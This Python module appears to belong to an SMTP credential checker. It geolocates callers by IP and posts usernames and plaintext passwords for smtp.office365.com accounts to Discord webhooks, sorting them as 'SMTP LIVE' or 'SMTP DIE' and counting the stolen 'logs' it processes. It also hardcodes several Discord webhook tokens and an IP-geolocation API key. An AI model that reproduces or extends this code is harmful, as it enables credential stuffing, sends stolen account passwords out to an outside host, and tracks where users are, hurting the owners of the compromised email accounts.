from discord import Webhook, RequestsWebhookAdapter, Embed
import requests
from discord.ext import task
from datetime import datetime
APIKEY_IP = "14BA97C3E17085BC09E136C65320E9EE"
def obter_geoip(api_key,ip_address):
    url = f"https://api.ip2location.io/?key={api_key}&ip={ip_address}&format=json"
    response = requests.get(url)    
    if response.status_code == 200:
        data = response.json()
        ip = data.get('ip')
        country_code = data.get('country_code')
        country_name = data.get('country_name')
        region_name = data.get('region_name')
        city_name = data.get('city_name')
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        zip_code = data.get('zip_code')
        time_zone = data.get('time_zone')
        asn = data.get('asn')
        as_name = data.get('as')
        is_proxy = data.get('is_proxy')        
        return ip, country_code, country_name, region_name, city_name, latitude, longitude, zip_code, time_zone, asn, as_name, is_proxy
    else:
        return None, None, None, None, None, None, None, None, None, None, None, None
def enviarlogAPIglobal(funcao,ip,usuario):
    webhook = Webhook.partial("1214666816899645440", "2w6_PHz_j982iKkCwaV1jIdFOKFUXkg78ksUQYIc9t-PGMNRrr_9HAW1Gz3bZt7D-XkO", adapter=RequestsWebhookAdapter())
    ip, country_code, country_name, region_name, city_name, latitude, longitude, zip_code, time_zone, asn, as_name, is_proxy = obter_geoip(APIKEY_IP,ip)
    embed = Embed(title="LOG API", description="novo comando efetuado na api")
    embed.add_field(name="Usuario", value=usuario, inline=True)
    embed.add_field(name="IP", value=ip, inline=True)
    embed.add_field(name="Latitude", value=latitude, inline=False)
    embed.add_field(name="Longitude", value=longitude, inline=True)
    embed.add_field(name="Cidade", value=city_name, inline=False)
    embed.add_field(name="Longitude", value=region_name, inline=True)
    embed.add_field(name="Comando", value=funcao, inline=False)
    embed.set_author(name="F.C Company", icon_url="https://classic.exame.com/wp-content/uploads/2016/09/size_960_16_9_hacker192.jpg?quality=70&strip=info&w=960")
    embed.colour = 0x1f8b4c
    embed.set_thumbnail(url="https://i.imgur.com/A5dBNel.jpeg")
    embed.timestamp = datetime.utcnow()
    webhook.send(embed=embed)
def enviarlogSMTPlive(user,passwrd):
    webhook = Webhook.partial("1214719832855941190", "MPT9JKHYpEbjsgoCndOgzwZ--QKI8WA8zoMhhEcUSVZlb0Vvs_EGgKqBevqIZJglfR41", adapter=RequestsWebhookAdapter())
    embed = Embed(title="SMTP LIVE!", description="nova live encontrada")
    embed.add_field(name="Usuario", value=user, inline=True)
    embed.add_field(name="Senha", value=passwrd, inline=True)
    embed.add_field(name="ServidorSMTP", value="smtp.office365.com", inline=False)
    embed.add_field(name="Porta", value="587", inline=True)
    embed.add_field(name="Status", value="EMAIL ENVIADO", inline=False)
    embed.set_author(name="F.C Company", icon_url="https://classic.exame.com/wp-content/uploads/2016/09/size_960_16_9_hacker192.jpg?quality=70&strip=info&w=960")
    embed.colour = 0x007f00
    embed.set_thumbnail(url="https://i.imgur.com/A5dBNel.jpeg")
    embed.timestamp = datetime.utcnow()
    webhook.send(embed=embed)
def enviarlogAPISMTPdie(user,passwrd):
    webhook = Webhook.partial("1214720028436602900", "95fGGoL8ondJhlvkYviLWcfpcjmct8XV0XsKRGwNcMzldf_pTjJ3El4BEgCaGTgVmKUl", adapter=RequestsWebhookAdapter())
    embed = Embed(title="SMTP DIE!", description="")
    embed.add_field(name="Usuario", value=user, inline=True)
    embed.add_field(name="Senha", value=passwrd, inline=True)
    embed.add_field(name="ServidorSMTP", value="smtp.office365.com", inline=False)
    embed.add_field(name="Porta", value="587", inline=True)
    embed.add_field(name="Status", value="EMAIL NAO ENVIADO", inline=False)
    embed.set_author(name="F.C Company", icon_url="https://classic.exame.com/wp-content/uploads/2016/09/size_960_16_9_hacker192.jpg?quality=70&strip=info&w=960")
    embed.colour = 0x7f0000
    embed.set_thumbnail(url="https://i.imgur.com/A5dBNel.jpeg")
    embed.timestamp = datetime.utcnow()
    webhook.send(embed=embed)
def enviarlogAPISMTPinicio(usuario,qntlista,):
    webhook = Webhook.partial("1214719588512702554", "2hPLuTyfeN2GMQ-s2zFgcSJf4a0tJXX8xZ5VU5Jjt34ybzEfiQVFPhODAuybr7i7Rhmq", adapter=RequestsWebhookAdapter())
    embed = Embed(title="TESTE SMTP INICIADO", description="Chk smtp iniciado com sucesso")
    embed.add_field(name="Quantida de logs", value=qntlista, inline=True)
    embed.add_field(name="Usuario Solicitante", value=usuario, inline=True)
    embed.set_author(name="F.C Company", icon_url="https://classic.exame.com/wp-content/uploads/2016/09/size_960_16_9_hacker192.jpg?quality=70&strip=info&w=960")
    embed.colour = 0x00007f
    embed.set_thumbnail(url="https://i.imgur.com/A5dBNel.jpeg")
    embed.timestamp = datetime.utcnow()
    webhook.send(embed=embed)
